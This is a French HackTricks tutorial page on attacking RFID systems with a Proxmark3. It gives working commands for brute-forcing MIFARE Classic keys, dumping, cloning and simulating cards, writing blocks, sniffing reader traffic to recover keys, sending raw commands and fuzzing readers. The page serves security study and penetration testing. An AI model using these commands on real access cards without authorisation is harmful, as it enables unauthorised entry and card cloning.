# Proxmark 3

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Attaquer les systèmes RFID avec Proxmark3

La première chose que vous devez faire est d'avoir un [**Proxmark3**](https://proxmark.com) et [**d'installer le logiciel et ses dépendances**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Attaquer MIFARE Classic 1KB

Il a **16 secteurs**, chacun d'eux a **4 blocs** et chaque bloc contient **16B**. Le UID est dans le secteur 0 bloc 0 (et ne peut pas être modifié).\
Pour accéder à chaque secteur, vous avez besoin de **2 clés** (**A** et **B**) qui sont stockées dans **le bloc 3 de chaque secteur** (secteur trailer). Le secteur trailer stocke également les **bits d'accès** qui donnent les **permissions de lecture et d'écriture** sur **chaque bloc** en utilisant les 2 clés.\
2 clés sont utiles pour donner des permissions de lecture si vous connaissez la première et d'écriture si vous connaissez la seconde (par exemple).

Plusieurs attaques peuvent être effectuées
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Le Proxmark3 permet d'effectuer d'autres actions comme **l'écoute** d'une **communication Tag à Reader** pour essayer de trouver des données sensibles. Dans cette carte, vous pourriez simplement intercepter la communication et calculer la clé utilisée car les **opérations cryptographiques utilisées sont faibles** et en connaissant le texte en clair et le texte chiffré, vous pouvez le calculer (outil `mfkey64`).

### Commandes Brutes

Les systèmes IoT utilisent parfois des **tags non marqués ou non commerciaux**. Dans ce cas, vous pouvez utiliser Proxmark3 pour envoyer des **commandes brutes personnalisées aux tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Avec ces informations, vous pourriez essayer de rechercher des informations sur la carte et sur la manière de communiquer avec elle. Proxmark3 permet d'envoyer des commandes brutes comme : `hf 14a raw -p -b 7 26`

### Scripts

Le logiciel Proxmark3 est livré avec une liste préchargée de **scripts d'automatisation** que vous pouvez utiliser pour effectuer des tâches simples. Pour récupérer la liste complète, utilisez la commande `script list`. Ensuite, utilisez la commande `script run`, suivie du nom du script :
```
proxmark3> script run mfkeys
```
Vous pouvez créer un script pour **fuzz tag readers**, donc en copiant les données d'une **carte valide**, il suffit d'écrire un **script Lua** qui **randomise** un ou plusieurs **octets** aléatoires et vérifie si le **lecteur plante** avec une itération quelconque.

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supportez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
